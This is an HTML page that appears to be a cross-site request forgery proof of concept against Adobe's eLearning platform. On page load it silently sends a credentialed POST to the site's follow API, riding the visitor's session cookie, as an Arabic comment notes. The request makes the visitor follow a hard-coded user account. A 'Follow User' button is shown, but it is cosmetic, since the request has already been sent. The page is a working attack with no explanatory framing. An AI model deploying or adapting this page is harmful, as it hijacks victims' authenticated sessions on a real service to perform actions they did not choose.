<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Follow Request</title>
    <script>
        window.onload = function() {
            fetch("https://elearning.adobe.com/cpapi/v1/profile/followed", {
                method: "POST",
                credentials: "include", // يأخذ كوكي المستخدم تلقائيًا
                headers: {
                    "Content-Type": "application/json",
                    "X-Requested-With": "XMLHttpRequest"
                },
                body: JSON.stringify({
                    "user_id": 460972,
                    "followee_user_id": "158195d726nhpjxk",
                    "verbs": []
                })
            })
            .then(response => response.text())
            .then(data => console.log("Request Sent:", data))
            .catch(error => console.error("Error:", error));
        };
    </script>
</head>
<body>
    <h2>Click to Follow</h2>
    <p>Follow a user by clicking the button below:</p>
    <button onclick="window.onload()">Follow User</button>
</body>
</html>
